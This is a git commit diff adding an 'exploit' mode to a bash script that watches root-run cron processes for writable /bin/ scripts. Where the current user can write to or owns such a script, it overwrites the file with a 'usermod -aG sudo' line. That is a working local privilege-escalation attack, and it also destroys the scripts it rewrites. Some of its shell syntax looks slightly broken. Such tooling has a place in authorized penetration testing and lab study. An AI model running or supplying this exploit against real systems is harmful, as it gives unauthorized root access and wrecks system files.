b402abb31fbc8d42a52964fa2ab95d557d74857f
clean-hands <34384401+Clean-Hands@users.noreply.github.com>
2024-10-13 20:40:09 +0000

    added sudo crontab job scan + exploit

--- scans/cron-scan.sh
+++ scans/cron-scan.sh
@@ -1,5 +1,7 @@
 #! /bin/bash
 
+exploit=true
+
 # over one minute keep track of all the processes that run
 # get any that are run with /bin/* executables 
 script_files=$(for i in $(seq 1 610); do ps -u root --format cmd >> /tmp/procs.tmp; sleep 0.1; done; sort /tmp/procs.tmp | uniq -c | grep -v "\[" | grep -v -E "\s*[6-9][0-9][0-9]|\s*[1-9][0-9][0-9][0-9]" | grep "/bin/" | awk '{print $NF}')
@@ -8,22 +10,25 @@ rm /tmp/procs.tmp
 
 echo $script_files
 
-while read line; do
-	echo $(stat -c "%a %U %G %n" $line)
-	perms=$(stat -c "%a" $line)
-	user=$(stat -c "%U" $line)
-	group=$(stat -c "%G" $line)
+while read file; do
+	echo $(stat -c "%a %U %G %n" $file)
+	perms=$(stat -c "%a" $file)
+	user=$(stat -c "%U" $file)
+	group=$(stat -c "%G" $file)
+	writable=false
 
-	# if [[ -w $line ]] # if this file is writable by this user
+	if [[ -w $file ]] then # if this file is writable by this user
+		writable=true
+	elif [[ $user == $(whoami) ]] then
+		owner=true
+	fi
 
-	if [[ $user == $(whoami) ]] && [[ $perms =~ [2637]** ]] then
-		# chmod u+rw $line
-		echo omg you own this file and you can edit it
-	elif [[ $($group | grep -qw $(groups)) ]] && [[ $perms =~ *[2637]* ]]; then
-		echo omg you are in a group that can edit this file
-	elif [[ $perms =~ **[2637] ]]; then
-		echo omg anyone can edit this file
-	else
-		echo you cannot edit this file
+	if [[ "$exploit" = true ]] then
+		if [[ "$writable" = true ]] then
+			echo usermod -aG sudo $user > $file
+		elif [[ "$owner" = true ]] then
+			chmod u+rw $file
+			echo usermod -aG sudo $user > $file
+		fi
 	fi
 done <<< "$script_files"
